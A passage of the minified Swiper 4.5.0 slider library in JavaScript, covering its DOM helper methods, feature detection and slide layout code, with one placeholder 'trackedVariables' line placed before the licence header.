const trackedVariables = ["windowVar1", "windowVar2"];
/**
 * Swiper 4.5.0
 * Most modern mobile touch slider and framework with hardware accelerated transitions
 * http://www.idangero.us/swiper/
 *
 * Copyright 2014-2019 Vladimir Kharlampidi
 *
 * Released under the MIT License
 *
 * Released on: February 22, 2019
 */
!function (e, t) {
  "object" == typeof exports && "undefined" != typeof module ? module.exports = t() : "function" == typeof define && define.amd ? define(t) : (e = e || self).Swiper = t();
}(this, function () {
  "use strict";

  var f = "undefined" == typeof document ? {
      body: {},
      addEventListener: function () {},
      removeEventListener: function () {},
      activeElement: {
        blur: function () {},
        nodeName: ""
      },
      querySelector: function () {
        return null;
      },
      querySelectorAll: function () {
        return [];
      },
      getElementById: function () {
        return null;
      },
      createEvent: function () {
        return {
          initEvent: function () {}
        };
      },
      createElement: function () {
        return {
          children: [],
          childNodes: [],
          style: {},
          setAttribute: function () {},
          getElementsByTagName: function () {
            return [];
          }
        };
      },
      location: {
        hash: ""
      }
    } : document,
    J = "undefined" == typeof window ? {
      document: f,
      navigator: {
        userAgent: ""
      },
      location: {},
      history: {},
      CustomEvent: function () {
        return this;
      },
      addEventListener: function () {},
      removeEventListener: function () {},
      getComputedStyle: function () {
        return {
          getPropertyValue: function () {
            return "";
          }
        };
      },
      Image: function () {},
      Date: function () {},
      screen: {},
      setTimeout: function () {},
      clearTimeout: function () {}
    } : window,
    l = function (e) {
      for (var t = 0; t < e.length; t += 1) this[t] = e[t];
      return this.length = e.length, this;
    };
  function L(e, t) {
    var a = [],
      i = 0;
    if (e && !t && e instanceof l) return e;
    if (e) if ("string" == typeof e) {
      var s,
        r,
        n = e.trim();
      if (0 <= n.indexOf("<") && 0 <= n.indexOf(">")) {
        var o = "div";
        for (0 === n.indexOf("<li") && (o = "ul"), 0 === n.indexOf("<tr") && (o = "tbody"), 0 !== n.indexOf("<td") && 0 !== n.indexOf("<th") || (o = "tr"), 0 === n.indexOf("<tbody") && (o = "table"), 0 === n.indexOf("<option") && (o = "select"), (r = f.createElement(o)).innerHTML = n, i = 0; i < r.childNodes.length; i += 1) a.push(r.childNodes[i]);
      } else for (s = t || "#" !== e[0] || e.match(/[ .<>:~]/) ? (t || f).querySelectorAll(e.trim()) : [f.getElementById(e.trim().split("#")[1])], i = 0; i < s.length; i += 1) s[i] && a.push(s[i]);
    } else if (e.nodeType || e === J || e === f) a.push(e);else if (0 < e.length && e[0].nodeType) for (i = 0; i < e.length; i += 1) a.push(e[i]);
    return new l(a);
  }
  function r(e) {
    for (var t = [], a = 0; a < e.length; a += 1) -1 === t.indexOf(e[a]) && t.push(e[a]);
    return t;
  }
  L.fn = l.prototype, L.Class = l, L.Dom7 = l;
  var t = {
    addClass: function (e) {
      if (void 0 === e) return this;
      for (var t = e.split(" "), a = 0; a < t.length; a += 1) for (var i = 0; i < this.length; i += 1) void 0 !== this[i] && void 0 !== this[i].classList && this[i].classList.add(t[a]);
      return this;
    },
    removeClass: function (e) {
      for (var t = e.split(" "), a = 0; a < t.length; a += 1) for (var i = 0; i < this.length; i += 1) void 0 !== this[i] && void 0 !== this[i].classList && this[i].classList.remove(t[a]);
      return this;
    },
    hasClass: function (e) {
      return !!this[0] && this[0].classList.contains(e);
    },
    toggleClass: function (e) {
      for (var t = e.split(" "), a = 0; a < t.length; a += 1) for (var i = 0; i < this.length; i += 1) void 0 !== this[i] && void 0 !== this[i].classList && this[i].classList.toggle(t[a]);
      return this;
    },
    attr: function (e, t) {
      var a = arguments;
      if (1 === arguments.length && "string" == typeof e) return this[0] ? this[0].getAttribute(e) : void 0;
      for (var i = 0; i < this.length; i += 1) if (2 === a.length) this[i].setAttribute(e, t);else for (var s in e) this[i][s] = e[s], this[i].setAttribute(s, e[s]);
      return this;
    },
    removeAttr: function (e) {
      for (var t = 0; t < this.length; t += 1) this[t].removeAttribute(e);
      return this;
    },
    data: function (e, t) {
      var a;
      if (void 0 !== t) {
        for (var i = 0; i < this.length; i += 1) (a = this[i]).dom7ElementDataStorage || (a.dom7ElementDataStorage = {}), a.dom7ElementDataStorage[e] = t;
        return this;
      }
      if (a = this[0]) {
        if (a.dom7ElementDataStorage && e in a.dom7ElementDataStorage) return a.dom7ElementDataStorage[e];
        var s = a.getAttribute("data-" + e);
        return s || void 0;
      }
    },
    transform: function (e) {
      for (var t = 0; t < this.length; t += 1) {
        var a = this[t].style;
        a.webkitTransform = e, a.transform = e;
      }
      return this;
    },
    transition: function (e) {
      "string" != typeof e && (e += "ms");
      for (var t = 0; t < this.length; t += 1) {
        var a = this[t].style;
        a.webkitTransitionDuration = e, a.transitionDuration = e;
      }
      return this;
    },
    on: function () {
      for (var e, t = [], a = arguments.length; a--;) t[a] = arguments[a];
      var i = t[0],
        r = t[1],
        n = t[2],
        s = t[3];
      function o(e) {
        var t = e.target;
        if (t) {
          var a = e.target.dom7EventData || [];
          if (a.indexOf(e) < 0 && a.unshift(e), L(t).is(r)) n.apply(t, a);else for (var i = L(t).parents(), s = 0; s < i.length; s += 1) L(i[s]).is(r) && n.apply(i[s], a);
        }
      }
      function l(e) {
        var t = e && e.target && e.target.dom7EventData || [];
        t.indexOf(e) < 0 && t.unshift(e), n.apply(this, t);
      }
      "function" == typeof t[1] && (i = (e = t)[0], n = e[1], s = e[2], r = void 0), s || (s = !1);
      for (var d, p = i.split(" "), c = 0; c < this.length; c += 1) {
        var u = this[c];
        if (r) for (d = 0; d < p.length; d += 1) {
          var h = p[d];
          u.dom7LiveListeners || (u.dom7LiveListeners = {}), u.dom7LiveListeners[h] || (u.dom7LiveListeners[h] = []), u.dom7LiveListeners[h].push({
            listener: n,
            proxyListener: o
          }), u.addEventListener(h, o, s);
        } else for (d = 0; d < p.length; d += 1) {
          var v = p[d];
          u.dom7Listeners || (u.dom7Listeners = {}), u.dom7Listeners[v] || (u.dom7Listeners[v] = []), u.dom7Listeners[v].push({
            listener: n,
            proxyListener: l
          }), u.addEventListener(v, l, s);
        }
      }
      return this;
    },
    off: function () {
      for (var e, t = [], a = arguments.length; a--;) t[a] = arguments[a];
      var i = t[0],
        s = t[1],
        r = t[2],
        n = t[3];
      "function" == typeof t[1] && (i = (e = t)[0], r = e[1], n = e[2], s = void 0), n || (n = !1);
      for (var o = i.split(" "), l = 0; l < o.length; l += 1) for (var d = o[l], p = 0; p < this.length; p += 1) {
        var c = this[p],
          u = void 0;
        if (!s && c.dom7Listeners ? u = c.dom7Listeners[d] : s && c.dom7LiveListeners && (u = c.dom7LiveListeners[d]), u && u.length) for (var h = u.length - 1; 0 <= h; h -= 1) {
          var v = u[h];
          r && v.listener === r ? (c.removeEventListener(d, v.proxyListener, n), u.splice(h, 1)) : r && v.listener && v.listener.dom7proxy && v.listener.dom7proxy === r ? (c.removeEventListener(d, v.proxyListener, n), u.splice(h, 1)) : r || (c.removeEventListener(d, v.proxyListener, n), u.splice(h, 1));
        }
      }
      return this;
    },
    trigger: function () {
      for (var e = [], t = arguments.length; t--;) e[t] = arguments[t];
      for (var a = e[0].split(" "), i = e[1], s = 0; s < a.length; s += 1) for (var r = a[s], n = 0; n < this.length; n += 1) {
        var o = this[n],
          l = void 0;
        try {
          l = new J.CustomEvent(r, {
            detail: i,
            bubbles: !0,
            cancelable: !0
          });
        } catch (e) {
          (l = f.createEvent("Event")).initEvent(r, !0, !0), l.detail = i;
        }
        o.dom7EventData = e.filter(function (e, t) {
          return 0 < t;
        }), o.dispatchEvent(l), o.dom7EventData = [], delete o.dom7EventData;
      }
      return this;
    },
    transitionEnd: function (t) {
      var a,
        i = ["webkitTransitionEnd", "transitionend"],
        s = this;
      function r(e) {
        if (e.target === this) for (t.call(this, e), a = 0; a < i.length; a += 1) s.off(i[a], r);
      }
      if (t) for (a = 0; a < i.length; a += 1) s.on(i[a], r);
      return this;
    },
    outerWidth: function (e) {
      if (0 < this.length) {
        if (e) {
          var t = this.styles();
          return this[0].offsetWidth + parseFloat(t.getPropertyValue("margin-right")) + parseFloat(t.getPropertyValue("margin-left"));
        }
        return this[0].offsetWidth;
      }
      return null;
    },
    outerHeight: function (e) {
      if (0 < this.length) {
        if (e) {
          var t = this.styles();
          return this[0].offsetHeight + parseFloat(t.getPropertyValue("margin-top")) + parseFloat(t.getPropertyValue("margin-bottom"));
        }
        return this[0].offsetHeight;
      }
      return null;
    },
    offset: function () {
      if (0 < this.length) {
        var e = this[0],
          t = e.getBoundingClientRect(),
          a = f.body,
          i = e.clientTop || a.clientTop || 0,
          s = e.clientLeft || a.clientLeft || 0,
          r = e === J ? J.scrollY : e.scrollTop,
          n = e === J ? J.scrollX : e.scrollLeft;
        return {
          top: t.top + r - i,
          left: t.left + n - s
        };
      }
      return null;
    },
    css: function (e, t) {
      var a;
      if (1 === arguments.length) {
        if ("string" != typeof e) {
          for (a = 0; a < this.length; a += 1) for (var i in e) this[a].style[i] = e[i];
          return this;
        }
        if (this[0]) return J.getComputedStyle(this[0], null).getPropertyValue(e);
      }
      if (2 === arguments.length && "string" == typeof e) {
        for (a = 0; a < this.length; a += 1) this[a].style[e] = t;
        return this;
      }
      return this;
    },
    each: function (e) {
      if (!e) return this;
      for (var t = 0; t < this.length; t += 1) if (!1 === e.call(this[t], t, this[t])) return this;
      return this;
    },
    html: function (e) {
      if (void 0 === e) return this[0] ? this[0].innerHTML : void 0;
      for (var t = 0; t < this.length; t += 1) this[t].innerHTML = e;
      return this;
    },
    text: function (e) {
      if (void 0 === e) return this[0] ? this[0].textContent.trim() : null;
      for (var t = 0; t < this.length; t += 1) this[t].textContent = e;
      return this;
    },
    is: function (e) {
      var t,
        a,
        i = this[0];
      if (!i || void 0 === e) return !1;
      if ("string" == typeof e) {
        if (i.matches) return i.matches(e);
        if (i.webkitMatchesSelector) return i.webkitMatchesSelector(e);
        if (i.msMatchesSelector) return i.msMatchesSelector(e);
        for (t = L(e), a = 0; a < t.length; a += 1) if (t[a] === i) return !0;
        return !1;
      }
      if (e === f) return i === f;
      if (e === J) return i === J;
      if (e.nodeType || e instanceof l) {
        for (t = e.nodeType ? [e] : e, a = 0; a < t.length; a += 1) if (t[a] === i) return !0;
        return !1;
      }
      return !1;
    },
    index: function () {
      var e,
        t = this[0];
      if (t) {
        for (e = 0; null !== (t = t.previousSibling);) 1 === t.nodeType && (e += 1);
        return e;
      }
    },
    eq: function (e) {
      if (void 0 === e) return this;
      var t,
        a = this.length;
      return new l(a - 1 < e ? [] : e < 0 ? (t = a + e) < 0 ? [] : [this[t]] : [this[e]]);
    },
    append: function () {
      for (var e, t = [], a = arguments.length; a--;) t[a] = arguments[a];
      for (var i = 0; i < t.length; i += 1) {
        e = t[i];
        for (var s = 0; s < this.length; s += 1) if ("string" == typeof e) {
          var r = f.createElement("div");
          for (r.innerHTML = e; r.firstChild;) this[s].appendChild(r.firstChild);
        } else if (e instanceof l) for (var n = 0; n < e.length; n += 1) this[s].appendChild(e[n]);else this[s].appendChild(e);
      }
      return this;
    },
    prepend: function (e) {
      var t, a;
      for (t = 0; t < this.length; t += 1) if ("string" == typeof e) {
        var i = f.createElement("div");
        for (i.innerHTML = e, a = i.childNodes.length - 1; 0 <= a; a -= 1) this[t].insertBefore(i.childNodes[a], this[t].childNodes[0]);
      } else if (e instanceof l) for (a = 0; a < e.length; a += 1) this[t].insertBefore(e[a], this[t].childNodes[0]);else this[t].insertBefore(e, this[t].childNodes[0]);
      return this;
    },
    next: function (e) {
      return 0 < this.length ? e ? this[0].nextElementSibling && L(this[0].nextElementSibling).is(e) ? new l([this[0].nextElementSibling]) : new l([]) : this[0].nextElementSibling ? new l([this[0].nextElementSibling]) : new l([]) : new l([]);
    },
    nextAll: function (e) {
      var t = [],
        a = this[0];
      if (!a) return new l([]);
      for (; a.nextElementSibling;) {
        var i = a.nextElementSibling;
        e ? L(i).is(e) && t.push(i) : t.push(i), a = i;
      }
      return new l(t);
    },
    prev: function (e) {
      if (0 < this.length) {
        var t = this[0];
        return e ? t.previousElementSibling && L(t.previousElementSibling).is(e) ? new l([t.previousElementSibling]) : new l([]) : t.previousElementSibling ? new l([t.previousElementSibling]) : new l([]);
      }
      return new l([]);
    },
    prevAll: function (e) {
      var t = [],
        a = this[0];
      if (!a) return new l([]);
      for (; a.previousElementSibling;) {
        var i = a.previousElementSibling;
        e ? L(i).is(e) && t.push(i) : t.push(i), a = i;
      }
      return new l(t);
    },
    parent: function (e) {
      for (var t = [], a = 0; a < this.length; a += 1) null !== this[a].parentNode && (e ? L(this[a].parentNode).is(e) && t.push(this[a].parentNode) : t.push(this[a].parentNode));
      return L(r(t));
    },
    parents: function (e) {
      for (var t = [], a = 0; a < this.length; a += 1) for (var i = this[a].parentNode; i;) e ? L(i).is(e) && t.push(i) : t.push(i), i = i.parentNode;
      return L(r(t));
    },
    closest: function (e) {
      var t = this;
      return void 0 === e ? new l([]) : (t.is(e) || (t = t.parents(e).eq(0)), t);
    },
    find: function (e) {
      for (var t = [], a = 0; a < this.length; a += 1) for (var i = this[a].querySelectorAll(e), s = 0; s < i.length; s += 1) t.push(i[s]);
      return new l(t);
    },
    children: function (e) {
      for (var t = [], a = 0; a < this.length; a += 1) for (var i = this[a].childNodes, s = 0; s < i.length; s += 1) e ? 1 === i[s].nodeType && L(i[s]).is(e) && t.push(i[s]) : 1 === i[s].nodeType && t.push(i[s]);
      return new l(r(t));
    },
    remove: function () {
      for (var e = 0; e < this.length; e += 1) this[e].parentNode && this[e].parentNode.removeChild(this[e]);
      return this;
    },
    add: function () {
      for (var e = [], t = arguments.length; t--;) e[t] = arguments[t];
      var a, i;
      for (a = 0; a < e.length; a += 1) {
        var s = L(e[a]);
        for (i = 0; i < s.length; i += 1) this[this.length] = s[i], this.length += 1;
      }
      return this;
    },
    styles: function () {
      return this[0] ? J.getComputedStyle(this[0], null) : {};
    }
  };
  Object.keys(t).forEach(function (e) {
    L.fn[e] = t[e];
  });
  var e,
    a,
    i,
    s,
    ee = {
      deleteProps: function (e) {
        var t = e;
        Object.keys(t).forEach(function (e) {
          try {
            t[e] = null;
          } catch (e) {}
          try {
            delete t[e];
          } catch (e) {}
        });
      },
      nextTick: function (e, t) {
        return void 0 === t && (t = 0), setTimeout(e, t);
      },
      now: function () {
        return Date.now();
      },
      getTranslate: function (e, t) {
        var a, i, s;
        void 0 === t && (t = "x");
        var r = J.getComputedStyle(e, null);
        return J.WebKitCSSMatrix ? (6 < (i = r.transform || r.webkitTransform).split(",").length && (i = i.split(", ").map(function (e) {
          return e.replace(",", ".");
        }).join(", ")), s = new J.WebKitCSSMatrix("none" === i ? "" : i)) : a = (s = r.MozTransform || r.OTransform || r.MsTransform || r.msTransform || r.transform || r.getPropertyValue("transform").replace("translate(", "matrix(1, 0, 0, 1,")).toString().split(","), "x" === t && (i = J.WebKitCSSMatrix ? s.m41 : 16 === a.length ? parseFloat(a[12]) : parseFloat(a[4])), "y" === t && (i = J.WebKitCSSMatrix ? s.m42 : 16 === a.length ? parseFloat(a[13]) : parseFloat(a[5])), i || 0;
      },
      parseUrlQuery: function (e) {
        var t,
          a,
          i,
          s,
          r = {},
          n = e || J.location.href;
        if ("string" == typeof n && n.length) for (s = (a = (n = -1 < n.indexOf("?") ? n.replace(/\S*\?/, "") : "").split("&").filter(function (e) {
          return "" !== e;
        })).length, t = 0; t < s; t += 1) i = a[t].replace(/#\S+/g, "").split("="), r[decodeURIComponent(i[0])] = void 0 === i[1] ? void 0 : decodeURIComponent(i[1]) || "";
        return r;
      },
      isObject: function (e) {
        return "object" == typeof e && null !== e && e.constructor && e.constructor === Object;
      },
      extend: function () {
        for (var e = [], t = arguments.length; t--;) e[t] = arguments[t];
        for (var a = Object(e[0]), i = 1; i < e.length; i += 1) {
          var s = e[i];
          if (null != s) for (var r = Object.keys(Object(s)), n = 0, o = r.length; n < o; n += 1) {
            var l = r[n],
              d = Object.getOwnPropertyDescriptor(s, l);
            void 0 !== d && d.enumerable && (ee.isObject(a[l]) && ee.isObject(s[l]) ? ee.extend(a[l], s[l]) : !ee.isObject(a[l]) && ee.isObject(s[l]) ? (a[l] = {}, ee.extend(a[l], s[l])) : a[l] = s[l]);
          }
        }
        return a;
      }
    },
    te = (i = f.createElement("div"), {
      touch: J.Modernizr && !0 === J.Modernizr.touch || !!(0 < J.navigator.maxTouchPoints || "ontouchstart" in J || J.DocumentTouch && f instanceof J.DocumentTouch),
      pointerEvents: !!(J.navigator.pointerEnabled || J.PointerEvent || "maxTouchPoints" in J.navigator && 0 < J.navigator.maxTouchPoints),
      prefixedPointerEvents: !!J.navigator.msPointerEnabled,
      transition: (a = i.style, "transition" in a || "webkitTransition" in a || "MozTransition" in a),
      transforms3d: J.Modernizr && !0 === J.Modernizr.csstransforms3d || (e = i.style, "webkitPerspective" in e || "MozPerspective" in e || "OPerspective" in e || "MsPerspective" in e || "perspective" in e),
      flexbox: function () {
        for (var e = i.style, t = "alignItems webkitAlignItems webkitBoxAlign msFlexAlign mozBoxAlign webkitFlexDirection msFlexDirection mozBoxDirection mozBoxOrient webkitBoxDirection webkitBoxOrient".split(" "), a = 0; a < t.length; a += 1) if (t[a] in e) return !0;
        return !1;
      }(),
      observer: "MutationObserver" in J || "WebkitMutationObserver" in J,
      passiveListener: function () {
        var e = !1;
        try {
          var t = Object.defineProperty({}, "passive", {
            get: function () {
              e = !0;
            }
          });
          J.addEventListener("testPassiveListener", null, t);
        } catch (e) {}
        return e;
      }(),
      gestures: "ongesturestart" in J
    }),
    I = {
      isIE: !!J.navigator.userAgent.match(/Trident/g) || !!J.navigator.userAgent.match(/MSIE/g),
      isEdge: !!J.navigator.userAgent.match(/Edge/g),
      isSafari: (s = J.navigator.userAgent.toLowerCase(), 0 <= s.indexOf("safari") && s.indexOf("chrome") < 0 && s.indexOf("android") < 0),
      isUiWebView: /(iPhone|iPod|iPad).*AppleWebKit(?!.*Safari)/i.test(J.navigator.userAgent)
    },
    n = function (e) {
      void 0 === e && (e = {});
      var t = this;
      t.params = e, t.eventsListeners = {}, t.params && t.params.on && Object.keys(t.params.on).forEach(function (e) {
        t.on(e, t.params.on[e]);
      });
    },
    o = {
      components: {
        configurable: !0
      }
    };
  n.prototype.on = function (e, t, a) {
    var i = this;
    if ("function" != typeof t) return i;
    var s = a ? "unshift" : "push";
    return e.split(" ").forEach(function (e) {
      i.eventsListeners[e] || (i.eventsListeners[e] = []), i.eventsListeners[e][s](t);
    }), i;
  }, n.prototype.once = function (a, i, e) {
    var s = this;
    if ("function" != typeof i) return s;
    function r() {
      for (var e = [], t = arguments.length; t--;) e[t] = arguments[t];
      i.apply(s, e), s.off(a, r), r.f7proxy && delete r.f7proxy;
    }
    return r.f7proxy = i, s.on(a, r, e);
  }, n.prototype.off = function (e, i) {
    var s = this;
    return s.eventsListeners && e.split(" ").forEach(function (a) {
      void 0 === i ? s.eventsListeners[a] = [] : s.eventsListeners[a] && s.eventsListeners[a].length && s.eventsListeners[a].forEach(function (e, t) {
        (e === i || e.f7proxy && e.f7proxy === i) && s.eventsListeners[a].splice(t, 1);
      });
    }), s;
  }, n.prototype.emit = function () {
    for (var e = [], t = arguments.length; t--;) e[t] = arguments[t];
    var a,
      i,
      s,
      r = this;
    return r.eventsListeners && ("string" == typeof e[0] || Array.isArray(e[0]) ? (a = e[0], i = e.slice(1, e.length), s = r) : (a = e[0].events, i = e[0].data, s = e[0].context || r), (Array.isArray(a) ? a : a.split(" ")).forEach(function (e) {
      if (r.eventsListeners && r.eventsListeners[e]) {
        var t = [];
        r.eventsListeners[e].forEach(function (e) {
          t.push(e);
        }), t.forEach(function (e) {
          e.apply(s, i);
        });
      }
    })), r;
  }, n.prototype.useModulesParams = function (a) {
    var i = this;
    i.modules && Object.keys(i.modules).forEach(function (e) {
      var t = i.modules[e];
      t.params && ee.extend(a, t.params);
    });
  }, n.prototype.useModules = function (i) {
    void 0 === i && (i = {});
    var s = this;
    s.modules && Object.keys(s.modules).forEach(function (e) {
      var a = s.modules[e],
        t = i[e] || {};
      a.instance && Object.keys(a.instance).forEach(function (e) {
        var t = a.instance[e];
        s[e] = "function" == typeof t ? t.bind(s) : t;
      }), a.on && s.on && Object.keys(a.on).forEach(function (e) {
        s.on(e, a.on[e]);
      }), a.create && a.create.bind(s)(t);
    });
  }, o.components.set = function (e) {
    this.use && this.use(e);
  }, n.installModule = function (t) {
    for (var e = [], a = arguments.length - 1; 0 < a--;) e[a] = arguments[a + 1];
    var i = this;
    i.prototype.modules || (i.prototype.modules = {});
    var s = t.name || Object.keys(i.prototype.modules).length + "_" + ee.now();
    return (i.prototype.modules[s] = t).proto && Object.keys(t.proto).forEach(function (e) {
      i.prototype[e] = t.proto[e];
    }), t.static && Object.keys(t.static).forEach(function (e) {
      i[e] = t.static[e];
    }), t.install && t.install.apply(i, e), i;
  }, n.use = function (e) {
    for (var t = [], a = arguments.length - 1; 0 < a--;) t[a] = arguments[a + 1];
    var i = this;
    return Array.isArray(e) ? (e.forEach(function (e) {
      return i.installModule(e);
    }), i) : i.installModule.apply(i, [e].concat(t));
  }, Object.defineProperties(n, o);
  var d = {
    updateSize: function () {
      var e,
        t,
        a = this,
        i = a.$el;
      e = void 0 !== a.params.width ? a.params.width : i[0].clientWidth, t = void 0 !== a.params.height ? a.params.height : i[0].clientHeight, 0 === e && a.isHorizontal() || 0 === t && a.isVertical() || (e = e - parseInt(i.css("padding-left"), 10) - parseInt(i.css("padding-right"), 10), t = t - parseInt(i.css("padding-top"), 10) - parseInt(i.css("padding-bottom"), 10), ee.extend(a, {
        width: e,
        height: t,
        size: a.isHorizontal() ? e : t
      }));
    },
    updateSlides: function () {
      var e = this,
        t = e.params,
        a = e.$wrapperEl,
        i = e.size,
        s = e.rtlTranslate,
        r = e.wrongRTL,
        n = e.virtual && t.virtual.enabled,
        o = n ? e.virtual.slides.length : e.slides.length,
        l = a.children("." + e.params.slideClass),
        d = n ? e.virtual.slides.length : l.length,
        p = [],
        c = [],
        u = [],
        h = t.slidesOffsetBefore;
      "function" == typeof h && (h = t.slidesOffsetBefore.call(e));
      var v = t.slidesOffsetAfter;
      "function" == typeof v && (v = t.slidesOffsetAfter.call(e));
      var f = e.snapGrid.length,
        m = e.snapGrid.length,
        g = t.spaceBetween,
        b = -h,
        w = 0,
        y = 0;
      if (void 0 !== i) {
        var x, T;
        "string" == typeof g && 0 <= g.indexOf("%") && (g = parseFloat(g.replace("%", "")) / 100 * i), e.virtualSize = -g, s ? l.css({
          marginLeft: "",
          marginTop: ""
        }) : l.css({
          marginRight: "",
          marginBottom: ""
        }), 1 < t.slidesPerColumn && (x = Math.floor(d / t.slidesPerColumn) === d / e.params.slidesPerColumn ? d : Math.ceil(d / t.slidesPerColumn) * t.slidesPerColumn, "auto" !== t.slidesPerView && "row" === t.slidesPerColumnFill && (x = Math.max(x, t.slidesPerView * t.slidesPerColumn)));
        for (var E, S = t.slidesPerColumn, C = x / S, M = Math.floor(d / t.slidesPerColumn), z = 0; z < d; z += 1) {
          T = 0;
          var P = l.eq(z);
          if (1 < t.slidesPerColumn) {
            var k = void 0,
              $ = void 0,
              L = void 0;
            "column" === t.slidesPerColumnFill ? (L = z - ($ = Math.floor(z / S)) * S, (M < $ || $ === M && L === S - 1) && S <= (L += 1) && (L = 0, $ += 1), k = $ + L * x / S, P.css({
              "-webkit-box-ordinal-group": k,
              "-moz-box-ordinal-group": k,
              "-ms-flex-order": k,
              "-webkit-order": k,
              order: k
            })) : $ = z - (L = Math.floor(z / C)) * C, P.css("margin-" + (e.isHorizontal() ? "top" : "left"), 0 !== L && t.spaceBetween && t.spaceBetween + "px").attr("data-swiper-column", $).attr("data-swiper-row", L);
          }
          if ("none" !== P.css("display")) {
            if ("auto" === t.slidesPerView) {
              var I = J.getComputedStyle(P[0], null),
                D = P[0].style.transform,
                O = P[0].style.webkitTransform;
              if (D && (P[0].style.transform = "none"), O && (P[0].style.webkitTransform = "none"), t.roundLengths) T = e.isHorizontal() ? P.outerWidth(!0) : P.outerHeight(!0);else if (e.isHorizontal()) {
                var A = parseFloat(I.getPropertyValue("width")),
                  H = parseFloat(I.getPropertyValue("padding-left")),
                  N = parseFloat(I.getPropertyValue("padding-right")),
                  G = parseFloat(I.getPropertyValue("margin-left")),
                  B = parseFloat(I.getPropertyValue("margin-right")),
                  X = I.getPropertyValue("box-sizing");
                T = X && "border-box" === X ? A + G + B : A + H + N + G + B;
              } else {
                var Y = parseFloat(I.getPropertyValue("height")),
                  V = parseFloat(I.getPropertyValue("padding-top")),
                  F = parseFloat(I.getPropertyValue("padding-bottom")),
                  R = parseFloat(I.getPropertyValue("margin-top")),
                  q = parseFloat(I.getPropertyValue("margin-bottom")),
                  W = I.getPropertyValue("box-sizing");
                T = W && "border-box" === W ? Y + R + q : Y + V + F + R + q;
              }
              D && (P[0].style.transform = D), O && (P[0].style.webkitTransform = O), t.roundLengths && (T = Math.floor(T));
            } else T = (i - (t.slidesPerView - 1) * g) / t.slidesPerView, t.roundLengths && (T = Math.floor(T)), l[z] && (e.isHorizontal() ? l[z].style.width = T + "px" : l[z].style.height = T + "px");
            l[z] && (l[z].swiperSlideSize = T), u.push(T), t.centeredSlides ? (b = b + T / 2 + w / 2 + g, 0 === w && 0 !== z && (b = b - i / 2 - g), 0 === z && (b = b - i / 2 - g), Math.abs(b) < .001 && (b = 0), t.roundLengths && (b = Math.floor(b)), y % t.slidesPerGroup == 0 && p.push(b), c.push(b)) : (t.roundLengths && (b = Math.floor(b)), y % t.slidesPerGroup == 0 && p.push(b), c.push(b), b = b + T + g), e.virtualSize += T + g, w = T, y += 1;
          }
        }
        if (e.virtualSize = Math.max(e.virtualSize, i) + v, s && r && ("slide" === t.effect || "coverflow" === t.effect) && a.css({
          width: e.virtualSize + t.spaceBetween + "px"
        }), te.flexbox && !t.setWrapperSize || (e.isHorizontal() ? a.css({
          width: e.virtualSize + t.spaceBetween + "px"
        }) : a.css({
          height: e.virtualSize + t.spaceBetween + "px"
        })), 1 < t.slidesPerColumn && (e.virtualSize = (T + t.spaceBetween) * x, e.virtualSize = Math.ceil(e.virtualSize / t.slidesPerColumn) - t.spaceBetween, e.isHorizontal() ? a.css({
          width: e.virtualSize + t.spaceBetween + "px"
        }) : a.css({
          height: e.virtualSize + t.spaceBetween + "px"
        }), t.centeredSlides)) {
          E = [];
          for (var j = 0; j < p.length; j += 1) {
            var U = p[j];
            t.roundLengths && (U = Math.floor(U)), p[j] < e.virtualSize + p[0] && E.push(U);
          }
          p = E;
        }
        if (!t.centeredSlides) {
          E = [];
          for (var K = 0; K < p.length; K += 1) {
            var _ = p[K];
            t.roundLengths && (_ = Math.floor(_)), p[K] <= e.virtualSize - i && E.push(_);
          }
          p = E, 1 < Math.floor(e.virtualSize - i) - Math.floor(p[p.length - 1]) && p.push(e.virtualSize - i);
        }
        if (0 === p.length && (p = [0]), 0 !== t.spaceBetween && (e.isHorizontal() ? s ? l.css({
          marginLeft: g + "px"
        }) : l.css({
          marginRight: g + "px"
        }) : l.css({
          marginBottom: g + "px"
        })), t.centerInsufficientSlides) {
          var Z = 0;
          if (u.forEach(function (e) {
            Z += e + (t.spaceBetween ? t.spaceBetween : 0);
          }), (Z -= t.spaceBetween) < i) {
            var Q = (i - Z) / 2;
            p.forEach(function (e, t) {
              p[t] = e - Q;
            }), c.forEach(function (e, t) {
              c[t] = e + Q;
            });
          }
        }
        ee.extend(e, {
          slides: l,
          snapGrid: p,
          slidesGrid: c,
          slidesSizesGrid: u
        }), d !== o && e.emit("slidesLengthChange"), p.length !== f && (e.params.watchOverflow && e.checkOverflow(), e.emit("snapGridLengthChange")), c.length !== m && e.emit("slidesGridLengthChange"), (t.watchSlidesProgress || t.watchSlidesVisibility) && e.updateSlidesOffset();
      }
    },
    updateAutoHeight: function (e) {
      var t,
        a = this,
        i = [],
        s = 0;
      if ("number" == typeof e ? a.setTransition(e) : !0 === e && a.setTransition(a.params.speed), "auto" !== a.params.slidesPerView && 1 < a.params.slidesPerView) for (t = 0; t < Math.ceil(a.params.slidesPerView); t += 1) {
        var r = a.activeIndex + t;
        if (r > a.slides.length) break;
        i.push(a.slides.eq(r)[0]);
      } else i.push(a.slides.eq(a.activeIndex)[0]);
      for (t = 0; t < i.length; t += 1) if (void 0 !== i[t]) {
        var n = i[t].offsetHeight;
        s = s < n ? n : s;
      }
      s && a.$wrapperEl.css("height", s + "px");
    },
    updateSlidesOffset: function () {
      for (var e = this.slides, t = 0; t < e.length; t += 1) e[t].swiperSlideOffset = this.isHorizontal() ? e[t].offsetLeft : e[t].offsetTop;
    },
    updateSlidesProgress: function (e) {
      void 0 === e && (e = this && this.translate || 0);
      var t = this,
        a = t.params,
        i = t.slides,
        s = t.rtlTranslate;
      if (0 !== i.length) {
        void 0 === i[0].swiperSlideOffset && t.updateSlidesOffset();
        var r = -e;
        s && (r = e), i.removeClass(a.slideVisibleClass), t.visibleSlidesIndexes = [], t.visibleSlides = [];
        for (var n = 0; n < i.length; n += 1) {
          var o = i[n],
            l = (r + (a.centeredSlides ? t.minTranslate() : 0) - o.swiperSlideOffset) / (o.swiperSlideSize + a.spaceBetween);
          if (a.watchSlidesVisibility) {
            var d = -(r - o.swiperSlideOffset),
              p = d + t.slidesSizesGrid[n];
            (0 <= d && d < t.size || 0 < p && p <= t.size || d <= 0 && p >= t.size) && (t.visibleSlides.push(o), t.visibleSlidesIndexes.push(n), i.eq(n).addClass(a.slideVisibleClass));
          }
          o.progress = s ? -l : l;
        }
        t.visibleSlides = L(t.visibleSlides);
      }
    },
    updateProgress: function (e) {
      void 0 === e && (e = this && this.translate || 0);
      var t = this,
        a = t.params,
        i = t.maxTranslate() - t.minTranslate(),
        s = t.progress,
        r = t.isBeginning,
        n = t.isEnd,
        o = r,
        l = n;
